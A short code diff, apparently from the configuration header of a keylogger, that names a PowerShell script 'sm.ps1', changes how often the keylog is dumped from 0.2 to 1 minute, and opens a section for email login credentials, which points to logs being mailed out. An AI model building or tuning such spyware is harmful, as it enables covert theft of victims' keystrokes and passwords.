@@ -15,9 +15,9 @@
 #define SCRIPT_NAME "sm.ps1"
 
 /**
- * How often the keylog is dumped
+ * How often the keylog is dumped in minutes
  **/
-#define FREQUENCY_MINUTES 0.2
+#define FREQUENCY_MINUTES 1
 
 /**
  * Login Credentials for email
